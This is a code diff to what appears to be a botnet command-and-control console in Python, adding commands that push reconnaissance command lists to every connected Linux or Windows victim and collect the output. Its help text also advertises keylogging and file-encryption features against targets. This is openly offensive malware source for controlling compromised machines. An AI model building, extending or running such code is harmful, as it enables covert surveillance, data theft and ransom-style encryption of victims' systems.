@@ -232,6 +232,40 @@ class BotnetCmdCtrl:
 				index = int(cmd[11:].strip())
 				self.send_cmd_windows_target(index)
 
+			elif cmd.strip() == 'auto recon linux':
+				b = 0
+				while b < len(AUTO_RECON_CMD_LIST_LINUX):
+					command_to_send = AUTO_RECON_CMD_LIST_LINUX[b]
+					resp_list = self.send_cmd_all_linux(command_to_send)
+					b += 1
+					i = 0
+					for output in resp_list:
+						if i % 2 == 1 and self.output_to_file == False:
+							print(output)
+						elif i % 2 == 1 and self.output_to_file:
+							print(output)
+							self.write_response_output(output, resp_list[resp_list.index(output) - 1])
+						else:
+							print((RED + output + RESET + '\n').replace(' ', ''))
+						i += 1
+
+			elif cmd.strip() == 'auto recon windows':
+				b = 0
+				while b < len(AUTO_RECON_CMD_LIST_WIN):
+					command_to_send = AUTO_RECON_CMD_LIST_WIN[b]
+					resp_list = self.send_cmd_all_windows(command_to_send)
+					b += 1
+					i = 0
+					for output in resp_list:
+						if i % 2 == 1 and self.output_to_file == False:
+							print(output)
+						elif i % 2 == 1 and self.output_to_file:
+							print(output)
+							self.write_response_output(output, resp_list[resp_list.index(output) - 1])
+						else:
+							print((RED + output + RESET + '\n').replace(' ', ''))
+						i += 1
+
 			elif cmd.strip() == 'switch': # Swithing writing modes: to stdout only, to stdout and file.
 				self.output_to_file = not self.output_to_file
 
@@ -394,6 +428,8 @@ class BotnetCmdCtrl:
 		print(ORANGE, '  select lin|win [IP index] >', RESET, 'Select number from list outputs and connect to one target.')
 		print(ORANGE, '  switch >', RESET, 'Switch writing modes: to std out, or to stdout and file.')
 		print(ORANGE, '  check mode >', RESET, 'Check write mode.')
+		print(ORANGE, '  autorecon linux >', RESET, 'Performs basic reconnaissance on Linux machines.' )
+		print(ORANGE, '  autorecon windows >', RESET, 'Performs basic reconnaissance on Windows machines.')
 		print(ORANGE, '  lin|win keylog >', RESET, 'Begin a keylogger, store data in tmp folder, file name log.txt.')
 		print(ORANGE, '  lin|win encrypt [path or file] >', RESET, 'Encrypt a file. Save the encryption key!')
 		print(ORANGE, '  lin|win decrypt [path or file] [key] >', RESET, 'Decrypt a file.')
